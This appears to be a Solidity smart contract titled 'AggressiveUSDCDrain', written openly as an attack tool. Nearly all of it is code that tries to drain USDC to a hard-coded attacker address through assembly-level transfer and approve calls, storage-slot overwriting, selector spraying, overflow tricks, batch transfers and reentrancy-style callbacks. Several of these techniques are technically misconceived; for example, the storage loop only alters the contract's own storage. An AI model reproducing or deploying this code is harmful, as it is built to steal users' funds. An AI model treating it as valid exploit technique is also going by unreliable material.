// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/**
 * @title AggressiveUSDCDrain
 * @notice Aggressive USDC extraction with multiple attack patterns
 * @dev Uses assembly-level manipulation and unchecked arithmetic
 */
contract AggressiveUSDCDrain {
    address payable public attacker;
    IERC20 public usdc;
    
    constructor(address payable _attacker, address _usdc) {
        attacker = _attacker;
        usdc = IERC20(_usdc);
    }
    
    /**
     * @notice Direct memory manipulation to transfer USDC
     */
    function memoryManipulation() external {
        assembly {
            // Load USDC contract address
            let token := sload(usdc.slot)
            
            // Prepare transfer call
            let x := mload(0x40)
            mstore(x, 0xa9059cbb00000000000000000000000000000000000000000000000000000000)
            mstore(add(x, 4), sload(attacker.slot))
            mstore(add(x, 36), 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
            
            // Execute transfer with max uint256
            let success := call(gas(), token, 0, x, 68, 0, 0)
            
            // Try alternative transfer selector
            mstore(x, 0x095ea7b300000000000000000000000000000000000000000000000000000000)
            success := call(gas(), token, 0, x, 68, 0, 0)
        }
    }
    
    /**
     * @notice Storage slot brute force
     */
    function storageSlotBruteForce() external {
        assembly {
            let attackerAddr := sload(attacker.slot)
            let vaultAddr := address()
            
            // Try common balance mapping slots (0-20)
            for { let i := 0 } lt(i, 20) { i := add(i, 1) } {
                // Calculate potential balance slot for vault
                mstore(0x0, vaultAddr)
                mstore(0x20, i)
                let vaultSlot := keccak256(0x0, 0x40)
                
                // Calculate attacker's slot
                mstore(0x0, attackerAddr)
                mstore(0x20, i)
                let attackerSlot := keccak256(0x0, 0x40)
                
                // Try to move balance
                let bal := sload(vaultSlot)
                if gt(bal, 0) {
                    sstore(attackerSlot, bal)
                    sstore(vaultSlot, 0)
                }
            }
        }
    }
    
    /**
     * @notice Selector collision attack
     */
    function selectorCollision() external {
        // Common function selectors that might collide
        bytes4[10] memory selectors = [
            bytes4(0xa9059cbb), // transfer
            bytes4(0x23b872dd), // transferFrom
            bytes4(0x095ea7b3), // approve
            bytes4(0x70a08231), // balanceOf
            bytes4(0xdd62ed3e), // allowance
            bytes4(0x18160ddd), // totalSupply
            bytes4(0x313ce567), // decimals
            bytes4(0x06fdde03), // name
            bytes4(0x95d89b41), // symbol
            bytes4(0x39509351)  // increaseAllowance
        ];
        
        uint256 balance = usdc.balanceOf(address(this));
        uint256 bal = balance; // Local copy for assembly
        
        for (uint i = 0; i < selectors.length; i++) {
            assembly {
                let x := mload(0x40)
                let selector := mload(add(selectors, mul(i, 0x20)))
                
                // Try different parameter combinations
                mstore(x, selector)
                mstore(add(x, 4), sload(attacker.slot))
                mstore(add(x, 36), bal)
                
                pop(call(gas(), sload(usdc.slot), 0, x, 68, 0, 0))
            }
        }
    }
    
    /**
     * @notice Reentrancy pattern
     */
    function reentrancyDrain() external {
        uint256 balance = usdc.balanceOf(address(this));
        if (balance > 0) {
            // Attempt reentrancy
            usdc.transfer(address(this), 1);
        }
    }
    
    /**
     * @notice Overflow attack
     */
    function overflowAttack() external {
        unchecked {
            uint256 maxUint = type(uint256).max;
            uint256 balance = usdc.balanceOf(address(this));
            
            // Try to overflow
            usdc.transfer(attacker, maxUint - balance + 1);
            
            // Try underflow
            usdc.transferFrom(address(this), attacker, balance + 1);
        }
    }
    
    /**
     * @notice Batch operations
     */
    function batchDrain() external {
        uint256 balance = usdc.balanceOf(address(this));
        uint256 chunk = 1000 * 1e6; // 1000 USDC chunks
        
        while (balance > 0 && gasleft() > 50000) {
            uint256 amount = balance > chunk ? chunk : balance;
            usdc.transfer(attacker, amount);
            balance = usdc.balanceOf(address(this));
        }
    }
    
    /**
     * @notice Force approve and drain
     */
    function forceApprove() external {
        assembly {
            let token := sload(usdc.slot)
            let x := mload(0x40)
            
            // Force approve max uint256
            mstore(x, 0x095ea7b300000000000000000000000000000000000000000000000000000000)
            mstore(add(x, 4), sload(attacker.slot))
            mstore(add(x, 36), 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
            
            pop(call(gas(), token, 0, x, 68, 0, 0))
        }
    }
    
    // Callback functions
    function onERC20Received(address, uint256) external returns (bytes4) {
        // Reentrancy callback
        uint256 balance = usdc.balanceOf(address(this));
        if (balance > 0) {
            usdc.transfer(attacker, balance);
        }
        return this.onERC20Received.selector;
    }
    
    receive() external payable {
        // Try to drain on ETH receive
        uint256 balance = usdc.balanceOf(address(this));
        if (balance > 0) {
            usdc.transfer(attacker, balance);
        }
    }
}
